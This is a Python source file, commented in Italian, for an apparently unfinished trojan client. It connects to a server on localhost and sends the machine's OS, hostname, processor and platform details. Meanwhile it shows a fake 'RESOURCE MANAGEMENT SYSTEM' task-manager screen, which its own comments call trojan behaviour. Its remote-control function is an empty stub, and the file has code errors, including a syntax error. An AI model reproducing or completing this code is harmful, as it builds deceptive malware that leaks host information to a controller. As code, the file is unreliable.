
import platform
import signal
from socket import *
import sys
import time
from os import name, system
import psutil
from threading import Thread




#Info globali
IP="localhost"
PORT=12000
ADDR=(IP,PORT)









#funzione di pulizia schermo per unix e windows
def clearScreen():
    #for windows
    if name == 'nt':
        _ = system('cls')
    #for mac and linux(here, os.name is 'posix')
    else:
        _ = system('clear')

def clientConnection():
    
    
    try:
        client=socket(AF_INET,SOCK_STREAM)
        client.connect(ADDR)
        print(f"Connessione avvenuta")
        return client
    except:
        print(f"\nConnessione non riuscita: riprovo tra 10 secondi...")
        time.sleep(10)
        clientConnection()

    

#gestisce il ctrl-C per l'uscita
def signalHandler(signum,frame):
    msg="Uscita effettuata con successo"
    print(":",msg,end="",flush=True)
    exit(1)


#1=windows 2=linux 3=macos
def systemChoice():
    if platform.system()=="Windows":
        return 3
    elif platform.system()=="Linux":
        return 2
    else:
        return 1


def remoteControl():
    #da scrivere

   

#comportamento da trojan
def trojanBehaviour():

    while True:
        cpu=psutil.cpu_percent()
        ram=psutil.virtual_memory().percent
        disk=psutil.disk_usage("/").percent
        processes_count=0
        print("\n\b\b\bRESOURCE MANAGEMENT SYSTEM\n")
        print("              --     Task manager: Current state of usage      --\n\n")
        #facciamo un display a video dell'utilizzo
        print("              --------------------------------------------------------- ")
        print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
        print("             | {:02}%       | {:02}%       | {:02}%        | {:03}               |".format(int(cpu),int(ram),int(disk),processes_count))
        print("              --------------------------------------------------------- ")
        time.sleep(1)
        clearScreen()

    





def main():

    signal.signal(signal.SIGINT,signalHandler)
    client=clientConnection()
    print("Invio informazioni sul mio sistema al server")

    #Info piattaforma
    infos="OS: "+platform.system()+"\nMachine: "+platform.machine()+"\nHost: "+platform.node()+"\nProcessor: "+platform.processor()+"\nPlatform: "+platform.platform()+"\nRelease: "+platform.release()
    client.send((infos).encode())


    #start trojan
    thread_trojan=Thread(target=trojanBehaviour)
    thread_trojan.start()
    thead_remoteControl=Thread(target=remoteControl)



if __name__ == "__main__":
    main()





